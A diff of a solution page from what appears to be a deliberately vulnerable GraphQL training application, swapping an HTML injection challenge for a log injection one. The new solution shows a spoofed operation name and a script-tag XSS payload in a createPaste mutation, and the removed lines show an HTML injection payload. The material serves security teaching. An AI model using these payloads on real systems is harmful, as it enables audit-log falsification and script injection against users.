@@ -1,32 +1,35 @@
 <!-- Start -->
-<h3 style="color:purple" id="inj-xss"><b>Injection :: HTML Injection</b></h3>
+<h3 style="color:purple" id="inj-log"><b>Injection :: Log Injection</b></h3>
 <hr />
 <h5>Problem Statement</h5>
 <p>
-  Similarly to the Cross Site Scripting problem, a paste can also include HTML tags that would render in the application, resulting in an HTML injection.
-</p>
+  GraphQL actions such as <code>mutation</code> and <code>query</code> have the ability to take an <code>operation name</code> as part of the query.
+  Here is an example query that uses <code>MyName</code> as an operation name:
+  <pre>query MyName {
+    getMyName
+    {
+      first
+      last
+    }
+  } </pre></p>
+  <p>The application is keeping track of all queries and mutations users are executing on this system in order to display them in the audit log.</p>
+  <p>However, the application is not doing a fair job at verifying the operation name.</p>
 <h5>Resources</h5>
 <ul>
   <li>
-    <a href="https://www.acunetix.com/blog/web-security-zone/html-injections/" target="_blank">
-      <i class="fa fa-newspaper"></i> Acunetix - HTML Injection
+    <a href="https://cwe.mitre.org/data/definitions/117.html" target= "_blank">
+      <i class="fa fa-newspaper"></i> CWE-117: Improper Output Neutralization for Logs
     </a>
   </li>
 </ul>
-<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-inj-html')">Show</button></h5>
-<div id="sol-inj-html" style="display:none">
+<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-inj-log')">Show</button></h5>
+<div id="sol-inj-log" style="display:none">
   <pre class="bash">
-    # Create New Paste allows inserting HTML tags
-    mutation {
-      createPaste(title:"&lt;h1&gt;hello!&lt;/h1&gt;", content:"zzzz", public:true) {
+    # Spoof the operation conducted to getPaste instead of createPaste
+    mutation getPaste{
+      createPaste(title:"&lt;script&gt;alert(1)&lt;/script&gt;", content:"zzzz", public:true) {
         pasteId
       }
-    }
-
-    # Content of HTML_Injection.html 
-    # &lt;h1&gt; Hello &lt;/h1&gt;!
-    mutation {
-      importPaste(host:"localhost", port:80, path:"/HTML_Injection.html"")
     }
   </pre>
 </div>
